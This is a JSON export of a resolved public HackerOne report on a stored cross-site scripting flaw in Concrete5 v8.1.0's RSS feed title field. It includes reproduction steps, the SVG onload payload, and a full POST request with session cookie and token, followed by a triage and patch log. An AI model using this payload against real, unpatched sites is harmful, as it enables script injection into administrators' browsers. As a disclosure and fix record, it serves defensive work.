{"id":221380,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjEzODA=","url":"https://hackerone.com/reports/221380","title":"Stored XSS in RSS Feeds Title (Concrete5 v8.1.0)","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-04-16T12:30:09.557Z","submitted_at":"2017-04-16T12:30:09.557Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"cdl","url":"/cdl","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/m967ScFufJoq7HwshTaonFwq/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":60,"url":"https://hackerone.com/concrete5","handle":"concrete5","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/060/c549a89ab4a3550cb9bfdeba1bee6d77e2019c7e_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/060/c549a89ab4a3550cb9bfdeba1bee6d77e2019c7e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"concrete5","twitter_handle":"concrete5","website":"https://www.concrete5.org","about":"A simple and powerful content management system."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-05-17T18:16:14.763Z","bug_reporter_agreed_on_going_public_at":"2017-04-17T18:16:07.953Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary / Description:**\nThe RSS Feeds Title (`pfTitle=`) parameter does not correctly sanitize user input. This allows HTML \u0026 Javascript to be stored and executed any time someone visits `/index.php/dashboard/pages/feeds` \n\n## Steps to Reproduce\n1. Open up Firefox\n2. Login (/index.php/login)\n3. Visit (index.php/dashboard/pages/feeds/add) to add a new RSS Feed\n4. Put `\"\u003e\u003csvg/onload=confirm(document.domain)\u003e` as the title \n5. Put whatever you want in the other fields and click add!\n\n**POST REQUEST**\n```\nPOST /index.php/dashboard/pages/feeds/add_feed HTTP/1.1\nHost: ec2-34-200-232-193.compute-1.amazonaws.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nReferer: http://ec2-34-200-232-193.compute-1.amazonaws.com/index.php/dashboard/pages/feeds/add\nCookie: CONCRETE5=qgl7qbdhh6le0jph3f07uo6eu0; CONCRETE5_LOGIN=1; dashboardPanelStatus=closed\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 351\n\nccm_token=1492345382%3A9f0e473b3d4455fe197861e0fa77d671\u0026pfTitle=%22%3E%3Csvg%2Fonload%3Dconfirm%28document.domain%29%3E\u0026pfHandle=cdl\u0026pfDescription=cdl\u0026iconFID=0\u0026cParentID=0\u0026ptID=0\u0026customTopicAttributeKeyHandle=\u0026customTopicTreeNodeID=0\u0026pfIncludeAllDescendents=0\u0026pfDisplayAliases=0\u0026pfDisplayFeaturedOnly=0\u0026pfContentToDisplay=S\u0026pfAreaHandleToDisplay=Main\n```\n6. `\u003csvg/onload=confirm(document.domain)\u003e` will be executed in your browser!\n\nAnytime someone visits the RSS Feeds page (index.php/dashboard/pages/feeds), the payload will fire!\n\n## Product, Version, and Configuration (If applicable)\nConcrete5 v8.1.0\n\n## Suggested Mitigation/Remediation Actions\nSanitize the `pfTitle=` parameter :)","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary / Description:\u003c/strong\u003e\u003cbr\u003e\nThe RSS Feeds Title (\u003ccode\u003epfTitle=\u003c/code\u003e) parameter does not correctly sanitize user input. This allows HTML \u0026amp; Javascript to be stored and executed any time someone visits \u003ccode\u003e/index.php/dashboard/pages/feeds\u003c/code\u003e \u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps to Reproduce\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eOpen up Firefox\u003c/li\u003e\n\u003cli\u003eLogin (/index.php/login)\u003c/li\u003e\n\u003cli\u003eVisit (index.php/dashboard/pages/feeds/add) to add a new RSS Feed\u003c/li\u003e\n\u003cli\u003ePut \u003ccode\u003e\u0026quot;\u0026gt;\u0026lt;svg/onload=confirm(document.domain)\u0026gt;\u003c/code\u003e as the title \u003c/li\u003e\n\u003cli\u003ePut whatever you want in the other fields and click add!\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u003cstrong\u003ePOST REQUEST\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /index.php/dashboard/pages/feeds/add_feed HTTP/1.1\nHost: ec2-34-200-232-193.compute-1.amazonaws.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nReferer: http://ec2-34-200-232-193.compute-1.amazonaws.com/index.php/dashboard/pages/feeds/add\nCookie: CONCRETE5=qgl7qbdhh6le0jph3f07uo6eu0; CONCRETE5_LOGIN=1; dashboardPanelStatus=closed\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 351\n\nccm_token=1492345382%3A9f0e473b3d4455fe197861e0fa77d671\u0026amp;pfTitle=%22%3E%3Csvg%2Fonload%3Dconfirm%28document.domain%29%3E\u0026amp;pfHandle=cdl\u0026amp;pfDescription=cdl\u0026amp;iconFID=0\u0026amp;cParentID=0\u0026amp;ptID=0\u0026amp;customTopicAttributeKeyHandle=\u0026amp;customTopicTreeNodeID=0\u0026amp;pfIncludeAllDescendents=0\u0026amp;pfDisplayAliases=0\u0026amp;pfDisplayFeaturedOnly=0\u0026amp;pfContentToDisplay=S\u0026amp;pfAreaHandleToDisplay=Main\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003ccode\u003e\u0026lt;svg/onload=confirm(document.domain)\u0026gt;\u003c/code\u003e will be executed in your browser!\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eAnytime someone visits the RSS Feeds page (index.php/dashboard/pages/feeds), the payload will fire!\u003c/p\u003e\n\n\u003ch2 id=\"product-version-and-configuration-if-applicable\"\u003eProduct, Version, and Configuration (If applicable)\u003c/h2\u003e\n\n\u003cp\u003eConcrete5 v8.1.0\u003c/p\u003e\n\n\u003ch2 id=\"suggested-mitigation-remediation-actions\"\u003eSuggested Mitigation/Remediation Actions\u003c/h2\u003e\n\n\u003cp\u003eSanitize the \u003ccode\u003epfTitle=\u003c/code\u003e parameter :)\u003c/p\u003e\n","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":176279,"file_name":"concrete5-rss-feed.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/176/279/8f903ea958091ef421ad65b3a3cb042903a28001/concrete5-rss-feed.png?response-content-disposition=attachment%3B%20filename%3D%22concrete5-rss-feed.png%22%3B%20filename%2A%3DUTF-8%27%27concrete5-rss-feed.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRAVCXZTG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T050028Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCDC1SbghdXLcy9ot06DANg74r5EiCC3XZ9CQGAdi%2BmbgIhALBQDzrYaszHyI6V41WOAEV%2Fa%2FxVgBgdKj18DrlZlW1RKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgxgXaQ5tEaz15kO93YqkQPMn8lqJM5b%2F2UF4vgQzRZODqw%2FjPEjzpD61mE7LpyVCQKuiixef4EDRyTs5YaVZ%2BSeI6BYbm829Q00SoHZnAn9tGULy0VEKf9Lyq8uAs7eAOStN9gpb9p9GsQ2vxpwHzC%2F%2FjQuXDX8lTd6eIkj3L4VFhPdt4MGf%2FwzTbeirX69pmEGa7VpqUl%2BzQFSRmiyNkLz0iIRuGyUxcUtEFnAa4dcYImN8d5Xmzj3VKwszN5CZZekG0f6wVgiDQt2PU05Sm4mXV8F7Zsd2gCjxy0LByxZo8wVIQRR7XpJjeAXw7Y%2BrcntwG4VG16O2JBB13PV47avtAluDB7xEmxCn7fC%2B0gCkgtqX5FvemeTqZkzDj%2BNAE87%2BEwY1GKygDSgK%2BDrUlCwwYU%2FB1k9vGEpOa46oz6dP6MWDopeRWpW%2Fh2qwIShnMsIk%2BmfjH9n%2FnOGNwWwQp93Hlr6OPw%2F8tYLstkLZrNH3jzkkWMoWcsrv71HzpJiG6RZtm22uXPNaQTbmOYqMX%2BCryjdGcVIctKAsj5EliP0zjCb4Kr%2FBTrqAW3ufL%2FR%2FpkxPRO%2BUhyyvDPzgPmCSraR2g7lBy3KlX6LZ3JukP4SRvLInSvSu0w4T7VQh0EVNyALDb1flUgqzAKwYanyEiiHqHeCF6g4fX5%2Fuz8knjUQsnKmjOQfBtyaMe0qlW%2BHWCfwsR%2Fh2SNKi%2BVT7%2FCT2Ct%2Fia0RQuGDOtTr7KGlRg89Qz6oCZtR4isqOEM5yt6saYHHNTOAelO07weXRwFwKuKqmrZYMA5sa9p7XKqJAwmjMWMyFxAcEDHOluiNcMsa9JfilicFsycW11kxP5ZdIbUgRRdK1IdlTu3Ykx5X3L1RmsfWjw%3D%3D\u0026X-Amz-Signature=c1356ea355510866914c95d691d293b7ff86688963ca1051b9635d7cfcc3927b","file_size":29381,"type":"image/png"},{"id":176280,"file_name":"concrete5-rss-feedsxss.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/176/280/5889447c8b22a98a6eec5af3ffee911f472624be/concrete5-rss-feedsxss.png?response-content-disposition=attachment%3B%20filename%3D%22concrete5-rss-feedsxss.png%22%3B%20filename%2A%3DUTF-8%27%27concrete5-rss-feedsxss.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRAVCXZTG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T050028Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCDC1SbghdXLcy9ot06DANg74r5EiCC3XZ9CQGAdi%2BmbgIhALBQDzrYaszHyI6V41WOAEV%2Fa%2FxVgBgdKj18DrlZlW1RKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgxgXaQ5tEaz15kO93YqkQPMn8lqJM5b%2F2UF4vgQzRZODqw%2FjPEjzpD61mE7LpyVCQKuiixef4EDRyTs5YaVZ%2BSeI6BYbm829Q00SoHZnAn9tGULy0VEKf9Lyq8uAs7eAOStN9gpb9p9GsQ2vxpwHzC%2F%2FjQuXDX8lTd6eIkj3L4VFhPdt4MGf%2FwzTbeirX69pmEGa7VpqUl%2BzQFSRmiyNkLz0iIRuGyUxcUtEFnAa4dcYImN8d5Xmzj3VKwszN5CZZekG0f6wVgiDQt2PU05Sm4mXV8F7Zsd2gCjxy0LByxZo8wVIQRR7XpJjeAXw7Y%2BrcntwG4VG16O2JBB13PV47avtAluDB7xEmxCn7fC%2B0gCkgtqX5FvemeTqZkzDj%2BNAE87%2BEwY1GKygDSgK%2BDrUlCwwYU%2FB1k9vGEpOa46oz6dP6MWDopeRWpW%2Fh2qwIShnMsIk%2BmfjH9n%2FnOGNwWwQp93Hlr6OPw%2F8tYLstkLZrNH3jzkkWMoWcsrv71HzpJiG6RZtm22uXPNaQTbmOYqMX%2BCryjdGcVIctKAsj5EliP0zjCb4Kr%2FBTrqAW3ufL%2FR%2FpkxPRO%2BUhyyvDPzgPmCSraR2g7lBy3KlX6LZ3JukP4SRvLInSvSu0w4T7VQh0EVNyALDb1flUgqzAKwYanyEiiHqHeCF6g4fX5%2Fuz8knjUQsnKmjOQfBtyaMe0qlW%2BHWCfwsR%2Fh2SNKi%2BVT7%2FCT2Ct%2Fia0RQuGDOtTr7KGlRg89Qz6oCZtR4isqOEM5yt6saYHHNTOAelO07weXRwFwKuKqmrZYMA5sa9p7XKqJAwmjMWMyFxAcEDHOluiNcMsa9JfilicFsycW11kxP5ZdIbUgRRdK1IdlTu3Ykx5X3L1RmsfWjw%3D%3D\u0026X-Amz-Signature=13332c48c1726185ba17a38a26964c4842530b34734f8433667fc3ee28d7dec1","file_size":234836,"type":"image/png"}],"allow_singular_disclosure_at":"2017-05-17T18:16:07.995Z","allow_singular_disclosure_after":-114173060.23511158,"singular_disclosure_allowed":true,"vote_count":4,"voters":["cdl","madrobot","eveeez","spetr0x"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1613898,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"**This report has been automatically set to \"needs more info\"** because it does not adhere to the rules listed [on our project page](https://hackerone.com/concrete5). Please go over these rules and resubmit following the directions.\r\n\r\nIf you've read and complied with all of the rules, please email security@concrete5.org so that this issue may be reopened.","markdown_message":"\u003cp\u003e\u003cstrong\u003eThis report has been automatically set to \u0026quot;needs more info\u0026quot;\u003c/strong\u003e because it does not adhere to the rules listed \u003ca href=\"https://hackerone.com/concrete5\"\u003eon our project page\u003c/a\u003e. Please go over these rules and resubmit following the directions.\u003c/p\u003e\n\n\u003cp\u003eIf you\u0026#39;ve read and complied with all of the rules, please email \u003ca title=\"security@concrete5.org\" href=\"mailto:security@concrete5.org\" rel=\"nofollow noopener noreferrer\"\u003esecurity@concrete5.org\u003c/a\u003e so that this issue may be reopened.\u003c/p\u003e\n","automated_response":true,"created_at":"2017-04-16T12:30:09.782Z","updated_at":"2017-04-16T12:30:09.782Z","actor":{"url":"/concrete5","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/060/c549a89ab4a3550cb9bfdeba1bee6d77e2019c7e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"concrete5"}},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1613901,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"I forgot the stinkin crayons for the 3rd time ! geez haha!","markdown_message":"\u003cp\u003eI forgot the stinkin crayons for the 3rd time ! geez haha!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-16T12:31:19.579Z","updated_at":"2017-04-16T12:31:19.579Z","actor":{"username":"cdl","cleared":true,"url":"/cdl","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/m967ScFufJoq7HwshTaonFwq/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1614016,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2017-04-16T16:12:17.308Z","updated_at":"2017-04-16T16:12:17.308Z","actor":{"username":"mnkras","cleared":false,"url":"/mnkras","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/844/ec0ad0d7189e5d34e9b4063ef708e600dca89435_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1616034,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"A patch for this bug has been merged into the development branch of concrete5 and will be available in the next version of concrete5.\n\nThank you for bringing this to our attention.","markdown_message":"\u003cp\u003eA patch for this bug has been merged into the development branch of concrete5 and will be available in the next version of concrete5.\u003c/p\u003e\n\n\u003cp\u003eThank you for bringing this to our attention.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-17T18:09:35.697Z","updated_at":"2017-04-17T18:09:35.697Z","actor":{"username":"mnkras","cleared":false,"url":"/mnkras","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/844/ec0ad0d7189e5d34e9b4063ef708e600dca89435_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"cdl","url":"/cdl"},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1616065,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"You're welcome! :) ","markdown_message":"\u003cp\u003eYou\u0026#39;re welcome! :) \u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-17T18:15:41.036Z","updated_at":"2017-04-17T18:15:41.036Z","actor":{"username":"cdl","cleared":true,"url":"/cdl","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/m967ScFufJoq7HwshTaonFwq/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1616067,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-04-17T18:16:07.973Z","updated_at":"2017-04-17T18:16:07.973Z","first_to_agree":true,"actor":{"username":"cdl","cleared":true,"url":"/cdl","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/m967ScFufJoq7HwshTaonFwq/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1681352,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-17T18:16:14.779Z","updated_at":"2017-05-17T18:16:14.779Z","actor":{"url":"/concrete5","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/060/c549a89ab4a3550cb9bfdeba1bee6d77e2019c7e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"concrete5"}},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}